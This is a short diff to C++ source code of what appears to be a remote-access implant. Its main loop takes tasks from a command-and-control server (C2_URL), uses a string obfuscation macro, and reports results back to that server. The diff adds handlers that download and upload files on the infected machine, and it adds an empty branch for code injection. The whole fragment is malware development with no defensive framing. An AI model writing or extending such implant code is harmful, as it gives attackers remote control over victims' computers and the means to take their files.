@@ -111,5 +111,16 @@ int main()
 			UpdateProfile(changes, currentProfile);
 			SendTaskResult(newTask->taskId.c_str(), C2_URL, "", true, currentProfile);
 		}
+		else if (opcode == OPCODE_DOWNLOAD) {
+			std::string result = Download(newTask->args->GetString());
+			SendTaskResult(newTask->taskId.c_str(), C2_URL, result, result != OBFUSCATED("ERROR"), currentProfile);
+		}
+		else if (opcode == OPCODE_UPLOAD) {
+			std::string result = Upload(newTask->args);
+			SendTaskResult(newTask->taskId.c_str(), C2_URL, result, result != OBFUSCATED("ERROR"), currentProfile);
+		}
+		else if (opcode == OPCODE_INJECT) {
+		
+		}
 	}
 }
